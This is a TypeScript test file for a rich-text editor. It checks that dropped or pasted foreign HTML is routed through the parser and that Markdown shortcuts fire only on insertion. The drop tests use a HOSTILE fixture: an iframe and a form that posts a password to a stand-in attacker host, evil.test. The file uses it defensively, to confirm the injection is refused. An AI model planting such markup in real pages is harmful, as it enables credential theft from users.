// @vitest-environment happy-dom
import { afterEach, describe, expect, test } from 'vitest';

import type { Block } from './index.ts';
import { blockText, createEditor } from './index.ts';
import type { NEditor } from './editor.ts';

/**
 * Input the editor did not author.
 *
 * Two rules meet here. The first is that content from outside the editor —
 * dropped or pasted — only ever enters through the parser, so the browser
 * never writes foreign markup into a live editing host. The second is that the
 * Markdown shortcuts read the text before the caret as something the user just
 * typed, which is only true when the input event actually inserted something.
 */

const editors: NEditor[] = [];

afterEach(() => {
  while (editors.length > 0) {
    editors.pop()?.destroy();
  }

  document.body.replaceChildren();
});

function block(over: Partial<Block>): Block {
  return {
    id: Math.random().toString(36).slice(2),
    type: 'paragraph',
    depth: 0,
    content: [],
    ...over,
  } as Block;
}

function mount(blocks: Block[], options: Record<string, unknown> = {}): NEditor {
  const host = document.createElement('div');
  document.body.append(host);
  const editor = createEditor({ element: host, doc: { blocks }, ...options });
  editors.push(editor);

  return editor;
}

const hosts = (editor: NEditor): HTMLElement[] => [
  ...editor.element.querySelectorAll<HTMLElement>('.neditor-block__content'),
];

function caretTo(host: HTMLElement, offset: 0 | 'end'): void {
  host.focus();
  const range = document.createRange();
  range.selectNodeContents(host);
  range.collapse(offset !== 'end');

  const selection = getSelection();
  selection?.removeAllRanges();
  selection?.addRange(range);
}

/** A native drag landing on `target`. Returns the event, to read its default. */
function drop(target: EventTarget, html: string, plain = ''): DragEvent {
  const data = new DataTransfer();
  data.setData('text/html', html);
  data.setData('text/plain', plain);

  const event = new DragEvent('drop', { bubbles: true, cancelable: true });
  // happy-dom drops `dataTransfer` from the event init, so it is attached the
  // way a real drag delivers it.
  Object.defineProperty(event, 'dataTransfer', { value: data });
  target.dispatchEvent(event);

  return event;
}

/**
 * Rewrites the host the way the browser would have, then reports the edit.
 *
 * The caret is collapsed in one call rather than cleared and re-added: an
 * empty selection is a selection *outside* every block, which closes the slash
 * menu on its own and would hide whether the input path ever reached it.
 */
function inputTo(host: HTMLElement, text: string, inputType: string): void {
  host.textContent = text;
  host.focus();

  const node = host.firstChild ?? host;
  getSelection()?.collapse(node, node === host ? 0 : text.length);
  host.dispatchEvent(new InputEvent('input', { inputType, bubbles: true }));
}

const slashMenuOpen = (): boolean =>
  document.querySelector<HTMLElement>('.neditor-slash-menu')?.hidden === false;

const slashOptionCount = (): number => document.querySelectorAll('[role="option"]').length;

describe('a drop from outside the editor', () => {
  const HOSTILE =
    '<iframe src="https://evil.test/x"></iframe>' +
    '<form action="https://evil.test/steal"><input type="password" name="p"></form>';

  test('is cancelled, so the browser never writes the dragged markup', () => {
    const editor = mount([block({ content: [{ text: 'hello' }] })]);
    const host = hosts(editor)[0]!;
    caretTo(host, 'end');

    const event = drop(host, HOSTILE);

    // The whole defence: the default action *is* the injection. Letting it
    // stand puts an iframe in a live host, and #syncFromDom then reads it back
    // as the block's own content, so no later render takes it out again.
    expect(event.defaultPrevented).toBe(true);
    expect(editor.element.querySelector('iframe')).toBe(null);
    expect(editor.element.querySelector('form')).toBe(null);
    expect(editor.element.querySelector('input')).toBe(null);
    expect(JSON.stringify(editor.getDocument())).not.toContain('evil.test');
  });

  test('is cancelled even where no block can be resolved', () => {
    const editor = mount([block({ content: [{ text: 'hello' }] })]);

    // The gutter, the padding around the blocks, the root itself: a drop we
    // cannot place is a drop to refuse, not one to hand back to the browser.
    const event = drop(editor.element, HOSTILE);

    expect(event.defaultPrevented).toBe(true);
    expect(blockText(editor.getDocument().blocks[0]!)).toBe('hello');
  });

  test('is cancelled on a read-only editor', () => {
    const editor = mount([block({ content: [{ text: 'hello' }] })], { editable: false });
    const host = hosts(editor)[0]!;

    const event = drop(host, HOSTILE);

    expect(event.defaultPrevented).toBe(true);
    expect(blockText(editor.getDocument().blocks[0]!)).toBe('hello');
  });

  test('enters through the parser, keeping marks and dropping markup', () => {
    const editor = mount([block({})]);
    const host = hosts(editor)[0]!;
    caretTo(host, 0);

    drop(host, '<p><strong>bold</strong> text</p>');

    const content = editor.getDocument().blocks[0]!.content;

    expect(blockText(editor.getDocument().blocks[0]!)).toBe('bold text');
    expect(content[0]?.marks).toEqual(['bold']);
  });

  test('splits into blocks the same way a paste does', () => {
    const editor = mount([block({})]);
    const host = hosts(editor)[0]!;
    caretTo(host, 0);

    drop(host, '<h1>Title</h1><p>body</p>');

    const types = editor.getDocument().blocks.map((each) => each.type);

    expect(types).toContain('heading1');
    expect(editor.getDocument().blocks.map(blockText).join('|')).toContain('Title');
  });

  test('stops arriving once the editor is destroyed', () => {
    const editor = mount([block({ content: [{ text: 'hello' }] })]);
    const host = hosts(editor)[0]!;
    editors.pop();
    editor.destroy();

    expect(drop(host, HOSTILE).defaultPrevented).toBe(false);
  });
});

describe('beforeinput carrying content the editor never parsed', () => {
  function beforeInput(host: HTMLElement, inputType: string): boolean {
    const event = new InputEvent('beforeinput', { inputType, bubbles: true, cancelable: true });
    host.dispatchEvent(event);

    return event.defaultPrevented;
  }

  test.each(['insertFromDrop', 'insertFromPaste', 'insertFromPasteAsQuotation', 'insertHTML'])(
    '%s is refused',
    (inputType: string) => {
      const editor = mount([block({ content: [{ text: 'hello' }] })]);
      const host = hosts(editor)[0]!;
      caretTo(host, 'end');

      expect(beforeInput(host, inputType)).toBe(true);
    },
  );

  test('a spellcheck correction is not refused', () => {
    const editor = mount([block({ content: [{ text: 'teh' }] })]);
    const host = hosts(editor)[0]!;
    caretTo(host, 'end');

    // insertReplacementText is the spellchecker fixing a word the document
    // already held. Refusing it would break spellcheck to close a hole it is
    // not part of.
    expect(beforeInput(host, 'insertReplacementText')).toBe(false);
  });
});

describe('Markdown shortcuts fire on insertion only', () => {
  test('deleting the word after a "# " leaves a paragraph holding the prefix', () => {
    const editor = mount([block({ content: [{ text: '# x' }] })]);
    const host = hosts(editor)[0]!;

    inputTo(host, '# ', 'deleteContentBackward');

    const first = editor.getDocument().blocks[0]!;

    expect(first.type).toBe('paragraph');
    expect(blockText(first)).toBe('# ');
  });

  test('deleting the character after "**bold**" applies no mark', () => {
    const editor = mount([block({ content: [{ text: '**bold**x' }] })]);
    const host = hosts(editor)[0]!;

    inputTo(host, '**bold**', 'deleteContentBackward');

    const first = editor.getDocument().blocks[0]!;

    expect(blockText(first)).toBe('**bold**');
    expect(first.content.some((run) => (run.marks?.length ?? 0) > 0)).toBe(false);
  });

  test('deleting the character after a "/" does not open the slash menu', () => {
    const editor = mount([block({ content: [{ text: '/x' }] })]);
    const host = hosts(editor)[0]!;

    inputTo(host, '/', 'deleteContentBackward');

    expect(slashMenuOpen()).toBe(false);
  });

  test('typing the space that completes "# " still makes a heading', () => {
    const editor = mount([block({ content: [{ text: '#' }] })]);
    const host = hosts(editor)[0]!;

    inputTo(host, '# ', 'insertText');

    expect(editor.getDocument().blocks[0]!.type).toBe('heading1');
  });

  test('typing "**bold**" still applies the mark', () => {
    const editor = mount([block({ content: [{ text: '**bold*' }] })]);
    const host = hosts(editor)[0]!;

    inputTo(host, '**bold**', 'insertText');

    const first = editor.getDocument().blocks[0]!;

    expect(blockText(first)).toBe('bold');
    expect(first.content[0]?.marks).toEqual(['bold']);
  });

  test('an open slash menu still tracks the query through a deletion', () => {
    const editor = mount([block({})]);
    const host = hosts(editor)[0]!;

    inputTo(host, '/', 'insertText');
    expect(slashMenuOpen()).toBe(true);

    const all = slashOptionCount();

    inputTo(host, '/he', 'insertText');
    expect(slashOptionCount()).toBeLessThan(all);

    // The menu reads the text rather than acting on it, so it is the one thing
    // here a deletion must still reach. Without it the query would stay stuck
    // at "he", and deleting the "/" would leave the menu open over a block
    // that no longer has one.
    inputTo(host, '/', 'deleteContentBackward');
    expect(slashOptionCount()).toBe(all);

    inputTo(host, '', 'deleteContentBackward');
    expect(slashMenuOpen()).toBe(false);
  });
});
